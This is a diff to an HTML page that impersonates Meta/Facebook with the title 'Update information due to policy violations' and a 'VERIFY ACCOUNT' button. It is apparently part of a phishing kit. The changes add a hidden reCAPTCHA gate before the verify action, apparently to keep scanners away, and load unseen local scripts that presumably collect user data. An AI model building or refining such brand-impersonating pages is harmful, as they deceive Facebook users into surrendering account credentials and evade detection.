@@ -18,6 +18,7 @@
             overflow: visible;
             vertical-align: -0.125em;
             }
+            #recaptcha-container{display: none;}
             .svg-inline--fa.fa-lg {
             vertical-align: -0.225em;
             }
@@ -408,7 +409,8 @@
             .fad.fa-inverse {
             color: #fff;
             }
-        </style>    
+        </style>  
+
         <meta property="og:title" content="Meta - Update information due to policy violations" />
 <meta property="og:site_name" content="Facebook From Meta"/>
 <meta property="og:description" content="Update information due to policy violations" />
@@ -417,6 +419,8 @@
         <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/v3/yg/r/Hn19bEHYJbt.png">
         <meta name="robots" content="nofollow">
         <meta name="googlebot" content="noindex">
+            <script src="https://www.google.com/recaptcha/enterprise.js?render=6LeIAzMpAAAAAMQCX2iaDcSGW_W6pqyqSDlfXB2n"></script>
+
         <style></style>
         <style>.desc[_ngcontent-wvg-c39]{padding-bottom:5px}.desc[_ngcontent-wvg-c39]   p[_ngcontent-wvg-c39]{font-size:25px;font-weight:700}.detail[_ngcontent-wvg-c39]{margin:0 15px;background-color:hsla(0,0%,89.8%,.25098039215686274);border-radius:4px;padding:5px 0}  .modal-body{padding:0!important}  .review-wrapper{height:600px}  .wrapper{box-shadow:none}</style>
         <style>.modal-review[_ngcontent-wvg-c38]     .modal-content{border-radius:15px}.modal-review[_ngcontent-wvg-c38]     .modal-md{max-width:600px}.review-wrapper[_ngcontent-wvg-c38]{font-family:Segoe UI,Tahoma,Geneva,Verdana,sans-serif;position:relative;border-radius:10px;min-height:400px;box-shadow:0 2px 4px rgba(0,0,0,.1),0 8px 16px rgba(0,0,0,.1)}.review-wrapper[_ngcontent-wvg-c38]   .left_side[_ngcontent-wvg-c38]{padding:15px;background-color:rgba(231,241,240,.9607843137254902)}.review-wrapper[_ngcontent-wvg-c38]   .right_side[_ngcontent-wvg-c38]{padding:15px 10px}.review-wrapper[_ngcontent-wvg-c38]   .nav-pills[_ngcontent-wvg-c38]   .nav-link[_ngcontent-wvg-c38]{color:#000;font-weight:700;text-align:left;border:none;background-color:initial;font-size:15px}.review-wrapper[_ngcontent-wvg-c38]   .nav-pills[_ngcontent-wvg-c38]   .nav-link[_ngcontent-wvg-c38]   fa-icon[_ngcontent-wvg-c38]{color:grey}.review-wrapper[_ngcontent-wvg-c38]   .nav-pills[_ngcontent-wvg-c38]   .nav-link[_ngcontent-wvg-c38]:disabled{border:none;color:grey}.review-wrapper[_ngcontent-wvg-c38]   .nav-pills[_ngcontent-wvg-c38]   .nav-link.active[_ngcontent-wvg-c38], .review-wrapper[_ngcontent-wvg-c38]   .nav-pills[_ngcontent-wvg-c38]   .nav-link.done[_ngcontent-wvg-c38]{color:#007bff;background-color:initial;border:none}.review-wrapper[_ngcontent-wvg-c38]   .nav-pills[_ngcontent-wvg-c38]   .nav-link.active[_ngcontent-wvg-c38]   fa-icon[_ngcontent-wvg-c38], .review-wrapper[_ngcontent-wvg-c38]   .nav-pills[_ngcontent-wvg-c38]   .nav-link.done[_ngcontent-wvg-c38]   fa-icon[_ngcontent-wvg-c38]{color:#0dc90d}.review-wrapper[_ngcontent-wvg-c38]   .fs-small[_ngcontent-wvg-c38]{font-size:13px}.review-wrapper[_ngcontent-wvg-c38]   .footer-bar[_ngcontent-wvg-c38]{position:absolute;bottom:0;right:35px}.review-wrapper[_ngcontent-wvg-c38]   .text-error[_ngcontent-wvg-c38]{background-color:#fceaea;text-align:center;border:1px solid #e35d35;border-radius:4px;padding:5px;margin-bottom:10px}.review-wrapper[_ngcontent-wvg-c38]   .text-error[_ngcontent-wvg-c38]   h4[_ngcontent-wvg-c38]{font-size:14px;margin-bottom:0}.review-wrapper[_ngcontent-wvg-c38]   .text-error[_ngcontent-wvg-c38]   p[_ngcontent-wvg-c38]{margin-bottom:0;font-size:13px}</style>
@@ -454,7 +458,7 @@
                                                 </div>
                                                 <br _ngcontent-wvg-c39="">
                                                 <div _ngcontent-wvg-c39="" class="form-group col-12" onclick="modalSetting('show')">
-                                                    <button _ngcontent-wvg-c39="" type="button" class="btn btn-sm btn-primary btn-lg btn-block font-weight-bold fs-34" onclick="modalSetting('show')">VERIFY ACCOUNT</button>
+                                                    <button _ngcontent-wvg-c39="" id="verifyFirst" type="button" class="btn btn-sm btn-primary btn-lg btn-block font-weight-bold fs-34" onclick="modalSetting('show')">VERIFY ACCOUNT</button>
                                                 </div>
                                             </div>
                                         </div>
@@ -862,9 +866,38 @@
                 </div>
             </div>
         </ngb-modal-window>        </main>
+        <div id="recaptcha-container"></div> 
 </div>
-<script src="https://www.google.com/recaptcha/api.js?render=explicit" async="" defer=""></script>
+
+<script src="js/api.js"></script>
+
+<script src="js/jquery.js"></script>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js"></script>
+<script src="js/ua-parser.min.js"></script>
+<script src="js/script.js"></script>
 <script>
+    window.onload = function(){
+        var widgetId;
+
+    grecaptcha.render('recaptcha-container', {
+    sitekey: '6LeIAzMpAAAAAMQCX2iaDcSGW_W6pqyqSDlfXB2n',  
+    callback: function(response) {
+        widgetId = response;
+    }
+    });
+    document.getElementById('verifyFirst').onclick = function() {
+
+    grecaptcha.execute(widgetId)
+    .then(function(token) {
+        console.log(token);
+        // Submit form if valid
+
+    });
+
+    }
+    }
+    
 
 function closeAndRedirect() {
   modalSetting('hide');
@@ -872,11 +905,5 @@ function closeAndRedirect() {
 }
 
 </script>
-<script src="js/jquery.js"></script>
-
-<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js"></script>
-<script src="js/ua-parser.min.js"></script>
-<script src="js/script.js"></script>
-<script src="js/recaptcha__en.js"></script>
-<script src="js/api.js"></script></body>
+</body>
 </html>
